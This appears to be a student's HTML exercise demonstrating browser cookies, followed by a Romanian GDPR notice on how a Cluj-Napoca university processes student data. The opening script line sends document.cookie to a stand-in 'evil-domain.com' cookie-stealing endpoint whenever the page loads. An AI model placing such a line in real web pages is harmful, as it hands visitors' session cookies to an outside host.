<script> 
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
document.cookie = "name=henrietta"; 
document.cookie = navigator.appCodeName;
document.cookie = navigator.appVersion;  

function doOnce() { if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) { alert(document.cookie); 
document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT"; } } 
function resetOnce() { document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT"; } //ES5 
if (document.cookie.split(';').some(function(item) { return item.indexOf('reader=1') >= 0 })) { console.log('The cookie "reader" has "1" for value') } //ES2016 
if (document.cookie.split(';').some((item) => item.includes('reader=1'))) { console.log('The cookie "reader" has "1" for value') } </script> 
<body>
  Bun venit pe pagina cu prajituri!<br>
  <button onclick="doOnce()">Vezi cookies</button><br>
  <button onclick="resetOnce()">Reseteaza buton cu cookie</button><br>
  <a href="https://didatec-my.sharepoint.com/:w:/r/personal/szilagyi_he_henri_utcluj_didatec_ro/_layouts/15/Doc.aspx?sourcedoc=%7B02175963-161C-4C61-9E55-04E30A59C7D6%7D&file=Analiza%20de%20impact.docx&action=edit&mobileredirect=true&wdNewAndOpenCt=1621792338112&ct=1621792338112&wdPreviousSession=0b3ed004-2258-4e6a-bb7d-185826811b79&wdOrigin=OFFICECOM-WEB.MAIN.UPLOAD">Acceseaza analiza de impact</a><br>
Szilagyi Henrietta-Andrea
  <br>
<b><i>Nota de informare cu privire la procesarea datelor cu caracter personal a unui student la Univ Tehnica din Cluj Napoca, masterul de eActivitati, care are inclus si un stagiu de mobilitate Erasmus in UK:</i></b><br>
Conform regulamentului UE 679/2016, UTCN este un operator de date.<br>
Date de contact UTCN: Str. C-tin Daicoviciu, nr. 15, sala , 400020 Cluj Napoca, Romania<br>
Telefon: 0264-401.309<br>
E-mail: Date.Personale@staff.utcluj.ro<br>
Colectam/prelucram datele dumneavoastra<br>
-in cursul admiterii, prin formular, iar apoi ca si studenti (masteranzi)<br>
-informatiile folosite:<br>
•	Nume, prenume<br>
•	Adresa<br>
•	CNP<br>
•	Email<br>
•	IBAN<br>
•	Adeverinta medicala<br>

-informatii folosite pentru:<br>
•	gestionarea studentilor<br>
•	cazari camine<br>
•	transmitere informatii prin email<br>
•	preluare burse<br>
•	decontare de abonamente<br>
-destinatari ai datelor cu caracter personal:<br>
•	Facultatea.... care este gazda stagiului Erasmus in UK<br>
•	Ministerul Educaţiei Naţionale, Ministerul Tineretului și Sportului;<br>
•	Instituţii publice: CASMB, Autorităţi locale, Poliţia Română șamd;<br>
•	Alte instituții de învătământ superior naţionale sau internaţionale;<br>
•	Instituții naţionale sau europene ce finanțează proiecte de cercetare;<br>
•	Organizații comerciale: bancare, unităţi de cazare, unităţi alimentare șamd;<br>
•	Asociații sau societăți ale studenților;<br>
•	Furnizori servicii IT.<br>

-drepturi:<br>
•	dreptul la informare. Aveți dreptul să primiți informații despre cum și de ce prelucrăm datele dumneavoastră personale;<br>
•	dreptul de retragere a consimţământului, în cazul în care prelucrarea se bazează pe articolul 6(1)a sau pe articolul 9(2)a;<br>
•	dreptul de a obţine din partea Universitaţii o confirmare că se prelucrează sau nu date cu caracter personal care vă privesc şi, în caz afirmativ, acces la datele respective;
•	dreptul de rectificare a datelor cu caracter personal care vă privesc;<br>
•	dreptul de ştergere a datelor cu caracter personal care vă privesc sau de restricţionare a prelucrării, sub rezerva anumitor excepții;<br>
•	dreptul la portabilitatea datelor, dacă prelucrarea se bazează pe consimţământ în temeiul articolului 6(1)a, sau pe articolului 9(2)a, sau pe un contract în temeiul articolului 6(1)b;<br>
•	dreptul de a vă opune prelucrărilor, sub rezerva anumitor excepții.<br>
-locatia si durata de stocare: Datele cu caracter personal colectate sunt stocate centralizat în spaţii și pe echipamente situate în cadrul Universitaţii Tehnice din Cluj-Napoca. Datele pot fi stocate și la nivel local de către personalul facultăţilor, în e-mail-uri, în documente electronice stocate pe diferite echipamente sau pe documente în format hârtie. Durata de stocare pentru fiecare categorie de date cu caracter personal este în conformitate cu cerinţele legale, cu reglementările interne ale Universitaţii și a celor mai bune practici din acest domeniu.<br>

</body>
